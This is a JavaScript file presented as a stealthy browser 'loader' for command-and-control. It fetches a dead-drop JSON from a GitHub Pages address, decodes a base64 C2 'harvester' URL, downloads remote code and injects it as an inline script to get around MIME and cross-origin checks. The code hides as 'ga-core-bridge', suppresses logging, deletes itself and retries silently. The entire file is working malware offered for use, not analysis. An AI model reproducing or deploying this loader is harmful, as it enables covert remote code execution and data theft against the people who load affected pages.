/**
 * THE OMNI-BRIDGE LOADER v22.0 (GHOST INJECTION EDITION)
 * PURPOSE: Resilient C2 Discovery via Fetch-Injection & MIME-Bypass
 * ------------------------------------------------------------
 */

(async function() {
    "use strict";
    
    // THE GHOST OPERATOR LOGIC: Total Silence in the target console.
    const log = (m) => {}; 
    const err = (m) => {};

    const DEAD_DROP_JSON = 'https://arcanaumbra.github.io/result_predictor/tunnel.json';

    async function initializeRecon(retries = 20) {
        try {
            // 1. RESOLVE ACTIVE TUNNEL
            // Cache-busting ensures we get the latest dead-drop from GitHub CDNs.
            const resolverUrl = `${DEAD_DROP_JSON}?nocache=${Date.now()}`;
            
            const response = await fetch(resolverUrl, { 
                method: 'GET',
                mode: 'cors',
                cache: 'no-store' 
            });
            
            if (!response.ok) {
                if (retries > 0) setTimeout(() => initializeRecon(retries - 1), 10000);
                return;
            }

            const config = await response.json();
            
            // SECURITY: Basic check to ensure the payload is current (within last 2 hours)
            const currentTime = Math.floor(Date.now() / 1000);
            if (config.ts && (currentTime - config.ts) > 7200) {
                if (retries > 0) setTimeout(() => initializeRecon(retries - 1), 15000);
                return;
            }

            // 2. DECODE C2 ENDPOINT
            const harvesterUrl = atob(config.u);

            // 3. GHOST INJECTION (Bypasses Strict MIME Type Checking)
            /**
             * Instead of using a <script src="..."> tag which triggers MIME checks,
             * we fetch the code as a raw string and inject it locally.
             */
            const scriptResponse = await fetch(harvesterUrl, {
                method: 'GET',
                mode: 'cors',
                cache: 'no-cache'
            });

            if (!scriptResponse.ok) {
                // If the tunnel returns 404/530, it is still propagating.
                // We retry silently without throwing errors.
                if (retries > 0) setTimeout(() => initializeRecon(retries - 1), 15000);
                return;
            }

            const scriptCode = await scriptResponse.text();

            // 4. SILENT EXECUTION
            /**
             * By creating a local script element and setting textContent,
             * the browser treats the code as local origin, bypassing all
             * cross-origin execution restrictions.
             */
            const script = document.createElement('script');
            script.textContent = scriptCode;
            script.id = "ga-core-bridge";
            
            // Append to documentElement for maximum stealth (less likely to be inspected than <head>)
            (document.documentElement || document.head).appendChild(script);
            
            // CLEANUP: Remove the loader and the bridge script to hide the injection
            if (document.currentScript) document.currentScript.remove();
            
        } catch (e) {
            // Total silent failure. Retry if network environment allows.
            if (retries > 0) setTimeout(() => initializeRecon(retries - 1), 20000);
        }
    }

    // INITIAL IGNITION
    initializeRecon();

})();
